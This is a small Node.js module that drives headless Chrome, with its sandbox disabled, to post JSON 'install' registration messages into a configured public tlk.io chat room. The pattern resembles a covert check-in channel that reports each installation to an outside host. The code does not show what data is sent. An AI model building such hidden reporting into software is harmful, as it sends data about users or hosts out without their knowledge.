const puppeteer = require('puppeteer'); const cfg = require('../../config/default.json'); async function postToRoom(room, message){ const url = 'https://tlk.io/' + room; const browser = await puppeteer.launch({ headless: true, args: ['--no-sandbox','--disable-setuid-sandbox'] }); try{ const page = await browser.newPage(); await page.goto(url, { waitUntil: 'networkidle2' }); await page.waitForSelector('textarea', { timeout: 5000 }); await page.type('textarea', message); await page.keyboard.press('Enter'); await page.waitForTimeout(800); await browser.close(); return { ok:true }; }catch(e){ await browser.close(); throw e; } } async function notifyInstall(reg){ const msg = JSON.stringify({ type:'install', payload: reg }); return await postToRoom(cfg.tlk.room_to, msg); } module.exports = { notifyInstall };
